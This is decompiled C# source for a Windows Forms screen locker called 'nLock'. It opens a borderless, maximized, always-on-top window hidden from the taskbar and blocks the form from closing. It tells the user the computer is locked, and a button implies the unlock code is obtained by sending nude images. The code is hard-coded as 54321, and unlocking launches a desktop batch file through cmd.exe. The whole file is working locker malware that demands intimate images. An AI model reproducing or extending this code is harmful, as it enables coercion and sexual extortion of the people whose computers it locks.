using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace nLock;

[DesignerGenerated]
public class Form1 : Form
{
	private static List<WeakReference> __ENCList = new List<WeakReference>();

	private IContainer components;

	[AccessedThroughProperty("Label1")]
	private Label _Label1;

	[AccessedThroughProperty("Label2")]
	private Label _Label2;

	[AccessedThroughProperty("Label3")]
	private Label _Label3;

	[AccessedThroughProperty("TextBox1")]
	private TextBox _TextBox1;

	[AccessedThroughProperty("Button1")]
	private Button _Button1;

	[AccessedThroughProperty("Button2")]
	private Button _Button2;

	[AccessedThroughProperty("Label4")]
	private Label _Label4;

	internal virtual Label Label1
	{
		[DebuggerNonUserCode]
		get
		{
			return _Label1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = Label1_Click;
			if (_Label1 != null)
			{
				((Control)_Label1).remove_Click(eventHandler);
			}
			_Label1 = value;
			if (_Label1 != null)
			{
				((Control)_Label1).add_Click(eventHandler);
			}
		}
	}

	internal virtual Label Label2
	{
		[DebuggerNonUserCode]
		get
		{
			return _Label2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = Label2_Click;
			if (_Label2 != null)
			{
				((Control)_Label2).remove_Click(eventHandler);
			}
			_Label2 = value;
			if (_Label2 != null)
			{
				((Control)_Label2).add_Click(eventHandler);
			}
		}
	}

	internal virtual Label Label3
	{
		[DebuggerNonUserCode]
		get
		{
			return _Label3;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = Label3_Click;
			if (_Label3 != null)
			{
				((Control)_Label3).remove_Click(eventHandler);
			}
			_Label3 = value;
			if (_Label3 != null)
			{
				((Control)_Label3).add_Click(eventHandler);
			}
		}
	}

	internal virtual TextBox TextBox1
	{
		[DebuggerNonUserCode]
		get
		{
			return _TextBox1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_TextBox1 = value;
		}
	}

	internal virtual Button Button1
	{
		[DebuggerNonUserCode]
		get
		{
			return _Button1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = Button1_Click;
			if (_Button1 != null)
			{
				((Control)_Button1).remove_Click(eventHandler);
			}
			_Button1 = value;
			if (_Button1 != null)
			{
				((Control)_Button1).add_Click(eventHandler);
			}
		}
	}

	internal virtual Button Button2
	{
		[DebuggerNonUserCode]
		get
		{
			return _Button2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = Button2_Click;
			if (_Button2 != null)
			{
				((Control)_Button2).remove_Click(eventHandler);
			}
			_Button2 = value;
			if (_Button2 != null)
			{
				((Control)_Button2).add_Click(eventHandler);
			}
		}
	}

	internal virtual Label Label4
	{
		[DebuggerNonUserCode]
		get
		{
			return _Label4;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Label4 = value;
		}
	}

	[DebuggerNonUserCode]
	public Form1()
	{
		//IL_000f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0019: Expected O, but got Unknown
		((Form)this).add_FormClosing(new FormClosingEventHandler(Form1_FormClosing));
		__ENCAddToList(this);
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	private static void __ENCAddToList(object value)
	{
		checked
		{
			lock (__ENCList)
			{
				if (__ENCList.Count == __ENCList.Capacity)
				{
					int num = 0;
					int num2 = __ENCList.Count - 1;
					int num3 = 0;
					while (true)
					{
						int num4 = num3;
						int num5 = num2;
						if (num4 > num5)
						{
							break;
						}
						WeakReference weakReference = __ENCList[num3];
						if (weakReference.IsAlive)
						{
							if (num3 != num)
							{
								__ENCList[num] = __ENCList[num3];
							}
							num++;
						}
						num3++;
					}
					__ENCList.RemoveRange(num, __ENCList.Count - num);
					__ENCList.Capacity = __ENCList.Count;
				}
				__ENCList.Add(new WeakReference(RuntimeHelpers.GetObjectValue(value)));
			}
		}
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if ((disposing && components != null) ? true : false)
			{
				components.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		//IL_0011: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Expected O, but got Unknown
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		//IL_0032: Unknown result type (might be due to invalid IL or missing references)
		//IL_003c: Expected O, but got Unknown
		//IL_003d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0047: Expected O, but got Unknown
		//IL_0048: Unknown result type (might be due to invalid IL or missing references)
		//IL_0052: Expected O, but got Unknown
		//IL_0053: Unknown result type (might be due to invalid IL or missing references)
		//IL_005d: Expected O, but got Unknown
		//IL_0082: Unknown result type (might be due to invalid IL or missing references)
		//IL_008c: Expected O, but got Unknown
		//IL_0117: Unknown result type (might be due to invalid IL or missing references)
		//IL_0121: Expected O, but got Unknown
		//IL_01ae: Unknown result type (might be due to invalid IL or missing references)
		//IL_01b8: Expected O, but got Unknown
		//IL_0245: Unknown result type (might be due to invalid IL or missing references)
		//IL_024f: Expected O, but got Unknown
		//IL_02c2: Unknown result type (might be due to invalid IL or missing references)
		//IL_02cc: Expected O, but got Unknown
		//IL_034f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0359: Expected O, but got Unknown
		//IL_03f4: Unknown result type (might be due to invalid IL or missing references)
		//IL_03fe: Expected O, but got Unknown
		//IL_053d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0547: Expected O, but got Unknown
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Form1));
		Label1 = new Label();
		Label2 = new Label();
		Label3 = new Label();
		TextBox1 = new TextBox();
		Button1 = new Button();
		Button2 = new Button();
		Label4 = new Label();
		((Control)this).SuspendLayout();
		Label1.set_AutoSize(true);
		((Control)Label1).set_Font(new Font("Microsoft Sans Serif", 72f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)Label1).set_ForeColor(SystemColors.ButtonFace);
		Label label = Label1;
		Point location = new Point(-1, 0);
		((Control)label).set_Location(location);
		((Control)Label1).set_Name("Label1");
		Label label2 = Label1;
		Size size = new Size(300, 108);
		((Control)label2).set_Size(size);
		((Control)Label1).set_TabIndex(0);
		Label1.set_Text("nLock");
		Label2.set_AutoSize(true);
		((Control)Label2).set_Font(new Font("Microsoft Sans Serif", 24f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)Label2).set_ForeColor(SystemColors.ButtonFace);
		Label label3 = Label2;
		location = new Point(12, 99);
		((Control)label3).set_Location(location);
		((Control)Label2).set_Name("Label2");
		Label label4 = Label2;
		size = new Size(822, 74);
		((Control)label4).set_Size(size);
		((Control)Label2).set_TabIndex(1);
		Label2.set_Text("Your computer has been locked. The only way to unlock \r\nit is to follow the instructions below");
		Label3.set_AutoSize(true);
		((Control)Label3).set_Font(new Font("Microsoft Sans Serif", 24f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)Label3).set_ForeColor(SystemColors.ButtonFace);
		Label label5 = Label3;
		location = new Point(10, 173);
		((Control)label5).set_Location(location);
		((Control)Label3).set_Name("Label3");
		Label label6 = Label3;
		size = new Size(899, 222);
		((Control)label6).set_Size(size);
		((Control)Label3).set_TabIndex(2);
		Label3.set_Text(componentResourceManager.GetString("Label3.Text"));
		((Control)TextBox1).set_Font(new Font("Microsoft Sans Serif", 27.75f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		TextBox textBox = TextBox1;
		location = new Point(455, 398);
		((Control)textBox).set_Location(location);
		((TextBoxBase)TextBox1).set_MaxLength(5);
		((Control)TextBox1).set_Name("TextBox1");
		TextBox textBox2 = TextBox1;
		size = new Size(182, 49);
		((Control)textBox2).set_Size(size);
		((Control)TextBox1).set_TabIndex(3);
		((Control)Button1).set_Font(new Font("Microsoft Sans Serif", 12f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		Button button = Button1;
		location = new Point(455, 453);
		((Control)button).set_Location(location);
		((Control)Button1).set_Name("Button1");
		Button button2 = Button1;
		size = new Size(182, 87);
		((Control)button2).set_Size(size);
		((Control)Button1).set_TabIndex(4);
		((ButtonBase)Button1).set_Text("I send my nudes and got\r\nthe unlock code");
		((ButtonBase)Button1).set_UseVisualStyleBackColor(true);
		((Control)Button2).set_Font(new Font("Microsoft Sans Serif", 24f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		Button button3 = Button2;
		location = new Point(745, 437);
		((Control)button3).set_Location(location);
		((Control)Button2).set_Name("Button2");
		Button button4 = Button2;
		size = new Size(182, 87);
		((Control)button4).set_Size(size);
		((Control)Button2).set_TabIndex(5);
		((ButtonBase)Button2).set_Text("Unlock");
		((ButtonBase)Button2).set_UseVisualStyleBackColor(true);
		((Control)Button2).set_Visible(false);
		Label4.set_AutoSize(true);
		((Control)Label4).set_Font(new Font("Microsoft Sans Serif", 48f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)Label4).set_ForeColor(SystemColors.ButtonFace);
		Label label7 = Label4;
		location = new Point(-9, 453);
		((Control)label7).set_Location(location);
		((Control)Label4).set_Name("Label4");
		Label label8 = Label4;
		size = new Size(458, 73);
		((Control)label8).set_Size(size);
		((Control)Label4).set_TabIndex(6);
		Label4.set_Text("EXTRA THICC");
		SizeF autoScaleDimensions = new SizeF(6f, 13f);
		((ContainerControl)this).set_AutoScaleDimensions(autoScaleDimensions);
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_BackColor(SystemColors.ActiveCaptionText);
		size = new Size(1083, 562);
		((Form)this).set_ClientSize(size);
		((Control)this).get_Controls().Add((Control)(object)Label4);
		((Control)this).get_Controls().Add((Control)(object)Button2);
		((Control)this).get_Controls().Add((Control)(object)Button1);
		((Control)this).get_Controls().Add((Control)(object)TextBox1);
		((Control)this).get_Controls().Add((Control)(object)Label3);
		((Control)this).get_Controls().Add((Control)(object)Label2);
		((Control)this).get_Controls().Add((Control)(object)Label1);
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Form)this).set_Icon((Icon)componentResourceManager.GetObject("$this.Icon"));
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("Form1");
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_Text("nLock");
		((Form)this).set_TopMost(true);
		((Form)this).set_WindowState((FormWindowState)2);
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}

	private void Form1_FormClosing(object sender, FormClosingEventArgs e)
	{
		//IL_0007: Unknown result type (might be due to invalid IL or missing references)
		Interaction.MsgBox((object)"Fuck You", (MsgBoxStyle)0, (object)null);
		((CancelEventArgs)(object)e).Cancel = true;
	}

	private void Label2_Click(object sender, EventArgs e)
	{
		//IL_0007: Unknown result type (might be due to invalid IL or missing references)
		Interaction.MsgBox((object)"Fuck You", (MsgBoxStyle)0, (object)null);
	}

	private void Label3_Click(object sender, EventArgs e)
	{
		//IL_0007: Unknown result type (might be due to invalid IL or missing references)
		Interaction.MsgBox((object)"Fuck You", (MsgBoxStyle)0, (object)null);
	}

	private void Button1_Click(object sender, EventArgs e)
	{
		if (Conversions.ToDouble(TextBox1.get_Text()) == 54321.0)
		{
			((Control)Button2).set_Visible(true);
		}
	}

	private void Label1_Click(object sender, EventArgs e)
	{
		//IL_0007: Unknown result type (might be due to invalid IL or missing references)
		Interaction.MsgBox((object)"Fuck You", (MsgBoxStyle)0, (object)null);
	}

	private void Button2_Click(object sender, EventArgs e)
	{
		((Control)this).Hide();
		Interaction.Shell("cmd.exe /c C:\\Users\\%USERNAME%\\Desktop\\cleanup.bat > log.txt & log.txt", (AppWinStyle)2, false, -1);
	}
}
